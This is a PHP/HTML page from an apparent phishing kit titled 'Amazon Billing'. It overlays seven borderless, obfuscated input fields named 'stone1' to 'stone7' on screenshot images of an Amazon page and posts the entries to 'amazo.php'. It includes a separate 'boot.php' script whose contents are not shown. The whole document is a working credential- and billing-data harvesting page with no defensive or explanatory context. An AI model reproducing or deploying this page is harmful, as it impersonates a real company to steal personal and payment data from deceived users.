<?php   ob_start();  ?>
<?
include "boot.php";
?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<link rel="icon" type="image/png" href="amazo/fav.png" />
<title>Amazon Billing</title>
</head>

<body>

<div style="position: absolute; width: 100px; height: 100px; z-index: 1; left:3px; top:0px" id="layer1">
  <form method="POST" action="amazo.php">
	<img border="0" src="amazo/amas.png" width="1349" height="155"><font color="#FFFFFF"><input placeholder="     " autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" id="fullname7" name="stone1" style="border-style:solid; border-color:#FFFFFF; top:541;position:absolute; left:204; width:198px; height:20px; padding-left:0; padding-right:0" size="41" required><input placeholder="     " autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" id="fullname6" name="stone2" style="border-style:solid; border-color:#FFFFFF; top:487;position:absolute; left:204; width:383px; height:20px; padding-left:0; padding-right:0" size="41" required><input placeholder="     " autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" id="fullname5" name="stone3" style="border-style:solid; border-color:#FFFFFF; top:459;position:absolute; left:204; width:383px; height:20px; padding-left:0; padding-right:0" size="41" required><input placeholder="     " autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" id="fullname4" name="stone4" style="border-style:solid; border-color:#FFFFFF; top:431;position:absolute; left:204; width:383px; height:20px; padding-left:0; padding-right:0" size="41" required><input placeholder="     " autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" id="fullname3" name="stone5" style="border-style:solid; border-color:#FFFFFF; top:391;position:absolute; left:204; width:383px; height:20px; padding-left:0; padding-right:0" size="41" required><input placeholder="     " autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" id="fullname2" name="stone6" style="border-style:solid; border-color:#FFFFFF; top:351;position:absolute; left:204; width:383px; height:20px; padding-left:0; padding-right:0" size="41" required><input placeholder="     " autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" id="fullname1" name="stone7" style="border-style:solid; border-color:#FFFFFF; top:323;position:absolute; left:204; width:383px; height:20px; padding-left:0; padding-right:0" size="41" required></font><div style="position: absolute; width: 100px; height: 100px; z-index: 1; left: 207px; top: 576px" id="layer2">
	<input type="image" src="amazo/xcdf.png" alt="Submit" name="I1">
</div>
	<p><img border="0" src="amazo/am.png"><img border="0" src="amazo/ama.png" width="1349" height="652"></div>

</body>

</html>